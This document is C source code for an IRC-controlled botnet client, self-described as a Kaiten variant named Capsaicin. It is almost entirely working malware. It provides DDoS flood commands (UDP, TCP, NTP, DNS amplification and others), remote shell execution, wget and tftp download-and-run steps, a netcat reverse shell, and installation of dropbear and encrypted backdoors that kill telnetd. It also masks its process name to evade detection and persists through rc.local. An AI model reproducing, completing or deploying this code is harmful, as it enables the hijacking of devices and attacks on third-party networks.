                        if(sender) Send(sock, "NOTICE %s :Killing pid %d.\n", sender,pids[i]);
                        kill(pids[i],9);
                }
        }
}

void killd(int sock, char *sender, int argc, char **argv) {
    char buf[1024]={0};
    if(disabled == 1) return;
    sprintf(buf,"kill -9 %d;kill -9 0",actualparent);
    system(buf);
    exit(0);
}

char *append(char *string1, char *string2) {
    char * result = NULL;
    asprintf(&result, "%s%s", string1, string2);
    return result;
}

int ismaster(char *sender, char *masters[], int nummasters) {
    int i;
    char *master;
    
    for (i=0; i < nummasters; i++) {
        master = append(masters[i], "!");
        if(!strncmp(master, sender, strlen(master)))
            return 1;
    }
    return 0;
}

void histClear(int sock, char *sender, int argc, char **argv) {
    ClearHistory();
    Send(sock, "NOTICE %s :History cleared!\n", sender);
    return;
}

struct FMessages { char *cmd; void (* func)(int,char *,int,char **); } flooders[] = {
        { "STD", sendSTD },
        { "UNKNOWN", unknown },
        { "HTTP", HTTP },
        { "WGETFLOOD", wgetHTTP },
        { "HOLD", hold },
        { "JUNK", junk },
        { "PAN", pan },
        { "UDP", udp },
        { "TCP", tcpflood },
        { "PHATWONK", phatwonk },
        { "NTP", ntp },
        { "SNMP", snmp },
        { "DNS", dns },
        { "BLACKNURSE", blacknurse },
        { "SCANNER", doScanner },
        { "DNS2IP", dns2ip },
        { "NICK", nickc },
        { "RNDNICK", rndnick },
        { "CLEARHISTORY", histClear },
        { "SERVER", move },
        { "GETSPOOFS", getspoofs },
        { "SPOOFS", spoof },
        { "HACKPKG", hackpkg },
        { "DISABLE", disable },
        { "ENABLE", enable },
        { "UPDATE", update },
        { "KILLMYEYEPEEUSINGHOIC", killd },
        { "GET", get },
        { "VERSION", version },
        { "KILLALL", killall },
        { "HELP", help },
{ (char *)0, (void (*)(int,char *,int,char **))0 } };

void _PRIVMSG(int sock, char *sender, char *str) {
        if(!ismaster(sender, masters, nummasters)) {
            return;
        }
        int i;
        char *to, *message;
        for (i=0;i<strlen(str) && str[i] != ' ';i++);
        str[i]=0;
        to=str;
        message=str+i+2;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
        if(*message == '!' && !strcasecmp(to,chan)) {
                char *params[12], name[1024]={0};
                int num_params=0, m;
                message++;
                for (i=0;i<strlen(message) && message[i] != ' ';i++);
                message[i]=0;
                if(strwildmatch(message,nick)) return;
                message+=i+1;
                if(!strncmp(message,"IRC ",4)) if(disabled) Send(sock, "NOTICE %s :Unable to comply.\n", sender); else Send(sock, "%s\n",message+4);
                if(!strncmp(message,"SH ",3)) {
                        char buf[1024];
                        FILE *command;
                        if(mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s",message+3);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock, "NOTICE %s :%s\n", sender,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
                }
 
 
        // SHD (daemonize sh command)
        if(!strncmp(message,"SHD ",4)) {
            char buf[1024];
            FILE *command;
            if(mfork(sender) != 0) return;
            memset(buf,0,1024);
            sprintf(buf,"export HOME=/tmp;export;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;trap '' 1 2; sh -c '%s'&",message+4);
            command=popen(buf,"r");
            while(!feof(command)) {
                memset(buf,0,1024);
                fgets(buf,1024,command);
                                Send(sock, "NOTICE %s :%s\n", sender,buf);
                sleep(1);
            }
            pclose(command);
            exit(0);
        }
   
// GETBB (this installs a better busybox, via tftp. This func, like the rest, has a dependency that we would like eliminate (in this case tftp). We really want to have the c program handle as much of thse custom funcs as possile. I am not graet with c, but proficient with linux, so i added these.
        if(!strncmp(message,"GETBB ",6)) {
            char buf[1024];
            FILE *command;
            if(mfork(sender) != 0) return;
            memset(buf,0,1024);
            sprintf(buf,"export fileGet=busybox-mips;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;cd /var;(([ ! -e /var/\"$fileGet\" ] || [ ! -s /var/\"$fileGet\" ]) && tftp -g -r \"$fileGet\" %s && chmod +x \"$fileGet\" && ./\"$fileGet\" mkdir bin && ./\"$fileGet\" --install -s /var/bin && ls -l \"$fileGet\" || echo It appears we already have /var/\"$fileGet\")",message+6);
            command=popen(buf,"r");
            while(!feof(command)) {
                memset(buf,0,1024);
                fgets(buf,1024,command);
                                Send(sock, "NOTICE %s :%s\n", sender,buf);
                sleep(1);
            }
            pclose(command);
            exit(0);
        }
       
 
// GETSSH (download, install, start dropbear, requires busybox for wget, mv, somet other things that are not always present on embedded devices
        if(!strncmp(message,"GETSSH ",7)) {
            char buf[1024];
            FILE *command;
            if(mfork(sender) != 0) return;
            memset(buf,0,1024);
            sprintf(buf,"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;cd /tmp;export url=%s;name=`echo \"$url\" | sed 's#.\x2a/##'` && wget -O \"$name\" \"$url\";chmod +x \"$name\";mv \"$name\" /var/bin;ls -l /var/bin/\"$name\" && dss=/var/dbs/dropbear_dss_host_key;rsa=/var/dbs/dropbear_rsa_host_key;ecd=/var/dbs/dropbear_ecdsa_host_key;cd /var/bin;for i in dropbear dbclient dropbearkey dropbearconvert;do ln -s /var/bin/dropbearmulti $i;done;[ ! -d /var/dbs ] && mkdir /var/dbs;[ -f $dss ] || dropbearkey -t dss -f $dss;[ -f $rsa ] || dropbearkey -t rsa -f $rsa;[ -f $ecd ] || dropbearkey -t ecdsa -f $ecd;dropbear -r $dss -r $rsa -r $ecd -p 30022;iptables -I INPUT 1 -p tcp --dport 30022 -j ACCEPT",message+7);
            command=popen(buf,"r");
            while(!feof(command)) {
                memset(buf,0,1024);
                fgets(buf,1024,command);
                                Send(sock, "NOTICE %s :%s\n", sender,buf);
                sleep(1);
            }
            pclose(command);
            exit(0);
        }
 
 
// INSTALL (uses wget to download and install a file into our hack path. This program already has a built in http func, so it would be great to use taht instead of needing to download busybox/wget first
 
        if(!strncmp(message,"INSTALL ",8)) {
                        char buf[1024];
                        FILE *command;
                        if(mfork(sender) != 0) return;
                        memset(buf,0,1024);
                     sprintf(buf,"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \"$url\" | sed 's#.\x2a/##'`;(([ ! -e /var/bin/$name ] || [ ! -s /var/bin/$name ]) && echo \"$name either doesnt exist or eq 0 so we get\" && cd /tmp && wget -O \"$name\" \"$url\" && chmod +x \"$name\" && mv \"$name\" /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \"It appears I already have $name\")",message+8);
            command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock, "NOTICE %s :%s\n", sender,buf);
                                sleep(1);
            }
                        pclose(command);
                        exit(0);
                }
 
 
// BINUPDATE http://server/file (like install, but updates the program)
 
        if(!strncmp(message,"BINUPDATE ",10)) {
                        char buf[1024];
                        FILE *command;
                        if(mfork(sender) != 0) return;
                        memset(buf,0,1024);
                     sprintf(buf,"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \"$url\" | sed 's#.*/##'`;([ -e /var/bin/$name ]) && echo $name exists so we delete it... && rm /var/bin/$name && cd /tmp && wget -O $name $url && chmod +x $name && mv $name /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \"$name doesnt exist, perhaps you mean INSTALL?\"",message+10);
            command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock, "NOTICE %s :%s\n", sender,buf);
                                sleep(1);
            }
                        pclose(command);
                        exit(0);
                }
 
// LOCKUP <http:server/backdoor>  (This kills telnet and installs my backdoor binary, which is aes encrypted. This is prob something else that would be cool to have built in to elimiate the dependency
 
        if(!strncmp(message,"LOCKUP ",7)) {
                        char buf[1024];
                        FILE *command;
                        if(mfork(sender) != 0) return;
                        memset(buf,0,1024);
                     sprintf(buf,"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;export HOME=/tmp;[ ! -f /var/bin/dmips ] && cd /var/bin;wget -O dmips %s;chmod +x /var/bin/dmips;(killall -9 telnetd || kill -9 telnetd) && (nohup dmips || trap '' 1 2 /var/bin/dmips)",message+7);
            command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock, "NOTICE %s :%s\n", sender,buf);
                                sleep(1);
            }
                        pclose(command);
                        exit(0);
                }
 
// !* RSHELL server.com 4444 (reverse shell via nc. We need a built in reverese shell functiomn to eliminiate taht dependency
        if(!strncmp(message,"RSHELL ",6)) {
                        char buf[1024];
                        FILE *command;
                        if(mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;trap '' 1 2; sh -c 'nohup nc %s -e /bin/sh '&",message+6);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock, "NOTICE %s :%s\n", sender,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
                }
 
//SCAN (calls a wrapper script. We need a built in port scanner that auto uploads the results to a server
        if(!strncmp(message,"SCAN ",5)) {
                        char buf[1024];
                        FILE *command;
                        if(mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;(([ ! -x /var/bin/scan ] || [ ! -x /var/bin/nmap ]) && echo \"I am missing either scan or nmap, and Shellzrus was on Xanax when he wrote this, so you need to do INSTALL http:\x2f\\server/nmap and INSTALL http:\x2f\x2fserver/scan first...\" && ([ -f /var/bin/nmap ] && ls -l /var/bin/nmap) && ([ -f /va\x72/bin/scan ] && ls -l /var/bin/scan) || scan %s)",message+5);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock, "NOTICE %s :%s\n", sender,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
                }
 
// !* BASH echo hello
        if(!strncmp(message,"BASH ",5)) {
                        char buf[1024];
                        FILE *command;
                        if(mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,"export HOME=/tmp;export SHELL=/var/bin/bash;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;%s",message+5);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock, "NOTICE %s :%s\n", sender,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
 
        }
                m=strlen(message);
                for (i=0;i<m;i++) {
                        if(*message == ' ' || *message == 0) break;
                        name[i]=*message;
                        message++;
                }
                for (i=0;i<strlen(message);i++) if(message[i] == ' ') num_params++;
                num_params++;
                if(num_params > 10) num_params=10;
                params[0]=name;
                params[num_params+1]="\0";
                m=1;
                while(*message != 0) {
                        message++;
                        if(m >= num_params) break;
                        for (i=0;i<strlen(message) && message[i] != ' ';i++);
                        params[m]=(char*)malloc(i+1);
                        strncpy(params[m],message,i);
                        params[m][i]=0;
                        m++;
                        message+=i;
                }
                for (m=0; flooders[m].cmd != (char *)0; m++) {
                        if(!strcasecmp(flooders[m].cmd,name)) {
                                flooders[m].func(sock, sender,num_params-1,params);
                                for (i=1;i<num_params;i++) free(params[i]);
                                return;
                        }
                }
        }
}

void _376(int sock, char *sender, char *str) {
        Send(sock, "MODE %s -xi\n",nick);
        Send(sock, "JOIN %s :%s\n",chan,key);
        Send(sock, "WHO %s\n",nick);
        if(scanPid == 0) {
            SeigHeil(sock);
            if(scanPid != 0) {
                //Send(sock, "PRIVMSG %s :[TELNET] [+] SCANNER STARTED!\n", chan); //Scanner has been started successfully!!!
            }
        }
}
void _PING(int sock, char *sender, char *str) {
        Send(sock, "PONG %s\n",str);
}
void _352(int sock, char *sender, char *str) {
        int i,d;
        char *msg=str;
        struct hostent *hostm;
        unsigned long m;
        for (i=0,d=0;d<5;d++) {
                for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                if(i == strlen(str)) return;
        }
        for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
        msg[i]=0;
        if(!strcasecmp(msg,nick) && !spoofsm) {
                msg=str;
                for (i=0,d=0;d<3;d++) {
                        for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                        if(i == strlen(str)) return;
                }
                for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
                msg[i]=0;
                if((m = inet_addr(msg)) == -1) {
                        if((hostm=gethostbyname(msg)) == NULL) {
                                Send(sock, "NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\n",chan);
                                return;
                        }
                        memcpy((char*)&m, hostm->h_addr, hostm->h_length);
                }
                ((char*)&spoofs)[3]=((char*)&m)[0];
                ((char*)&spoofs)[2]=((char*)&m)[1];
                ((char*)&spoofs)[1]=((char*)&m)[2];
                ((char*)&spoofs)[0]=0;
                spoofsm=256;
        }
}
void _433(int sock, char *sender, char *str) {
        free(nick);
        nick=randstring(realrand(4, 8));
}
void _NICK(int sock, char *sender, char *str) {
    int i;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
    if(!strcasecmp(sender,nick)) {
        if(*str == ':') str++;
        if(nick) free(nick);
        nick=randstring(realrand(4, 8));
    }
}
struct Messages { char *cmd; void (* func)(int,char *,char *); } msgs[] = {
        { "352", _352 },
        { "376", _376 },
        { "433", _433 },
        { "422", _376 },
        { "PRIVMSG", _PRIVMSG },
        { "PING", _PING },
    { "NICK", _NICK },
{ (char *)0, (void (*)(int,char *,char *))0 } };

void con() {
	    int error = 0;
        socklen_t len = sizeof (error);
        int retval = getsockopt (sock, SOL_SOCKET, SO_ERROR, &error, &len);
        if (retval != 0) {
            /* there was a problem getting the error code */
            //fprintf(stderr, "error getting socket error code: %s\n", strerror(retval));
        } else if (error != 0) {
            /* socket has a non zero error status */
            //fprintf(stderr, "socket error: %s\n", strerror(error));
        } else {
            //our sock is ay okay
            return;
        }
        struct sockaddr_in srv;
        unsigned long ipaddr,start;
        int flag;
        struct hostent *hp;
start:
    sock=-1;
    flag=1;
    if(changeservers == 0) server=servers[rand()%numservers];
    changeservers=0;
    while((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
    if(inet_addr(server) == 0 || inet_addr(server) == -1) {
        if((hp = gethostbyname(server)) == NULL) {
            server=NULL;
            close(sock);
            goto start;
        }
        bcopy((char*)hp->h_addr, (char*)&srv.sin_addr, hp->h_length);
    }
    else srv.sin_addr.s_addr=inet_addr(server);
        srv.sin_family = AF_INET;
        srv.sin_port = htons(6667); //Note to self: change to 443
    ioctl(sock,FIONBIO,&flag);
    start=time(NULL);
    while(time(NULL)-start < 10) {
        errno=0;
        if(connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0 || errno == EISCONN) {
                setsockopt(sock,SOL_SOCKET,SO_LINGER,0,0);
                setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,0,0);
                setsockopt(sock,SOL_SOCKET,SO_KEEPALIVE,0,0);
            return;
        }
        if(!(errno == EINPROGRESS ||errno == EALREADY)) break;
        sleep(1);
    }
    server=NULL;
    close(sock);
    goto start;
}

void makeFukdString(char *buf, int length) {
    srand(time(NULL));
    int i = 0;
    for(i = 0; i < length; i++) buf[i] = (rand() % 223) + 33; // No spaces.
}

void touchMyself(char **argv) {
   if(!fork()) {
        while(1) {
            makeFukdString(argv[0], 1024 + (rand() % 128)); // Crashes almost all /proc/pid/cmdline based botkillers. Including Mirai. sweg
            sleep(3); // rape process name every 3 seconds
        }
    }
    return;
}

int main(int argc, char **argv) {
	    setsid();
        signal(SIGPIPE, SIG_IGN);
        if(!fork()) { return; }
        touchMyself(&argv); // Mega anti botkill. completely hides process name. nearly like a rootkit but more noisy
  //      botkill();
        strcpy(dispass, "FreakIsYourGod!!!");
        int on,i;
        char cwd[256],*str;
        FILE *file;
#ifdef STARTUP
    str="/etc/rc.d/rc.local";
    file=fopen(str,"r");
    if(file == NULL) {
        str="/etc/rc.conf";
        file=fopen(str,"r");
    }
        if(file != NULL) {
                char outfile[256], buf[1024];
                int i=strlen(argv[0]), d=0;
                getcwd(cwd,256);
                if(strcmp(cwd,"/")) {
                        while(argv[0][i] != '/') i--;
                        sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
                        while(!feof(file)) {
                                fgets(buf,1024,file);
                                if(!strcasecmp(buf,outfile)) d++;
                        }
                        if(d == 0) {
                                FILE *out;
                                fclose(file);
                                out=fopen(str,"a");
                                if(out != NULL) {
                                        fputs(outfile,out);
                                        fclose(out);
                                }
                        }
                        else fclose(file);
                }
                else fclose(file);
        }
#endif
        for (on=1;on<argc;on++) memset(argv[on],0,strlen(argv[on]));
        srand((time(NULL) ^ getpid()) + getppid());
        nick=randstring(realrand(4, 8));
        ident=randstring(realrand(4, 8));
        user=randstring(realrand(4, 8));
        chan=CHAN;
    key=KEY;
    server=NULL;
sa:
#ifdef IDENT
        for (i=0;i<numpids;i++) {
                if(pids[i] != 0 && pids[i] != getpid()) {
                        kill(pids[i],9);
            waitpid(pids[i],NULL,WNOHANG);
                }
        }
    pids=NULL;
    numpids=0;
    identd();
#endif
    con();
        Send(sock, "NICK [%s|%s]%s\nUSER %s localhost localhost :%s\n", PREFIX, getBuild(), nick, user, ident);
        while(1) {
                unsigned long i;
                fd_set n;
                struct timeval tv;
                FD_ZERO(&n);
                FD_SET(sock,&n);
                tv.tv_sec=60*20;
                tv.tv_usec=0;
                if(select(sock+1,&n,(fd_set*)0,(fd_set*)0,&tv) <= 0) goto sa;
                for (i=0;i<numpids;i++) if(waitpid(pids[i],NULL,WNOHANG) > 0) {
                        unsigned int *newpids,on;
                        for (on=i+1;on<numpids;on++) pids[on-1]=pids[on];
            pids[on-1]=0;
                        numpids--;
                        newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
                        for (on=0;on<numpids;on++) newpids[on]=pids[on];
                        free(pids);
                        pids=newpids;
                }
                if(FD_ISSET(sock,&n)) {
                        char buf[4096], *str;
                        int i;
                        if((i=recv(sock,buf,4096,0)) <= 0) goto sa;
                        buf[i]=0;
                        str=strtok(buf,"\n");
                        while(str && *str) {
                                char name[1024], sender[1024];
                                filter(str);
                                if(*str == ':') {
                                        for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                        str[i]=0;
                                        strcpy(sender,str+1);
                                        strcpy(str,str+i+1);
                                }
                                else strcpy(sender,"*");
                                for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                str[i]=0;
                                strcpy(name,str);
                                strcpy(str,str+i+1);
                                for (i=0;msgs[i].cmd != (char *)0;i++) if(!strcasecmp(msgs[i].cmd,name)) msgs[i].func(sock, sender, str);
                                if(!strcasecmp(name, "ERROR")) {
                                    if(scanPid != 0) { // Is the scanner running?
                                        if(kill(scanPid, 9) == 0) { // Kill the knights scanner if we get disconnected
                                            scanPid = 0;
                                        }
                                    }
                                    
                                    close(sock); //Close old sock
                                    sleep(5);
                                    goto sa; // Start connection routine
                                }
                                str=strtok((char*)NULL,"\n");
                        }
                }
        }
        return 0;
}
/*
 * Uber kaiten variant coded by Freak a.k.a Milenko
 * Capsaicin IRC botnet (New lightaidra)
 * @Nullzsec on twitter
 * NullzSec ROCKS!!!! :D
 * Kik: rcew
 * XMPP/Jabber: Milenko@420blaze.it
 * Be a homie and gimme sum btc for serv0rs pls
 *
 * Listen: https://play.google.com/music/m/Ttlmdokq4gorrhdvx7k7od5v33e?t=The_Link_-_YTCracker
 */